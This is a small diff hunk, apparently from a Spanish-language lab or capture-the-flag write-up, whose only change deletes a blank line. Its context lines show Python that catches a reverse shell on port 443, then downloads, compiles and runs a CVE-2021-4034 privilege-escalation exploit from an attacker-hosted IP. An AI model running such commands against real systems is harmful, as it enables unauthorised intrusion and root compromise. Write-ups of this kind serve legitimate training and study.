@@ -99,7 +99,6 @@ shell = listen(443, timeout=20).wait_for_connection()
 # Cambiar IP por la vuestra
 shell.sendline('cd /tmp; wget http://10.10.16.78:8000/CVE-2021-4034.zip > /dev/null 2>&1; unzip -q CVE-2021-4034.zip; make 2>/dev/null; ./cve-2021-4034')
 shell.interactive()
-
 ```
 
 <p> </p>
